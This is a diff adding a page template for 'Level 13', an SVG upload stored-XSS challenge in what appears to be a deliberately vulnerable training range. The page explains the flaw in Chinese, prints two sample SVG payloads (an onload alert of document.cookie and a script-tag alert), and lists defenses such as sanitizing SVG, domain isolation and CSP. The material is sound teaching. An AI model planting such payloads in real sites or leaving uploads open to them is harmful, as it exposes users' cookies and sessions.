@@ -1,0 +1,43 @@
+{% extends "base.html" %}
+{% block title %}Level 13 - SVG XSS | UploadRanger{% endblock %}
+{% block content %}
+<div class="nav"><a href="/">← 返回首页</a></div>
+<div class="card">
+    <h2>Level 13: SVG 文件上传 XSS</h2>
+    <span class="difficulty medium">中等</span>
+    <div class="info-box">
+        <h4>关卡说明</h4>
+        <p>服务端允许上传 SVG 图片。SVG 是 XML 格式，支持内嵌 JavaScript。</p>
+        <p>上传含恶意 JS 的 SVG 后，其他用户访问该文件时触发存储型 XSS。</p>
+    </div>
+    {% with messages = get_flashed_messages(with_categories=true) %}
+        {% if messages %}{% for category, message in messages %}
+            <div class="alert {{ category }}">{{ message }}</div>
+        {% endfor %}{% endif %}
+    {% endwith %}
+    <form method="post" enctype="multipart/form-data" class="upload-form">
+        <div class="form-group">
+            <label for="file">选择图片文件 (jpg/png/gif/svg):</label>
+            <input type="file" name="file" id="file" accept=".jpg,.jpeg,.png,.gif,.svg" required>
+        </div>
+        <button type="submit" class="btn">上传图片</button>
+    </form>
+</div>
+<div class="card">
+    <h3>攻击 Payload 示例</h3>
+    <p>上传以下内容的 <code>xss.svg</code>：</p>
+    <pre style="background:#1a1a2e;padding:1rem;border-radius:4px;color:#e8e8e8;overflow:auto;">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"&gt;
+  &lt;rect width="100" height="100"/&gt;
+&lt;/svg&gt;</pre>
+    <p>或者使用 script 标签：</p>
+    <pre style="background:#1a1a2e;padding:1rem;border-radius:4px;color:#e8e8e8;overflow:auto;">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/svg&gt;</pre>
+    <h3>防御方案</h3>
+    <ul>
+        <li>禁止上传 SVG，或对 SVG 进行净化（移除脚本元素）</li>
+        <li>上传文件通过独立域名访问（隔离 cookie），设置 <code>Content-Disposition: attachment</code></li>
+        <li>响应头添加 <code>Content-Security-Policy</code> 限制脚本执行</li>
+    </ul>
+</div>
+{% endblock %}
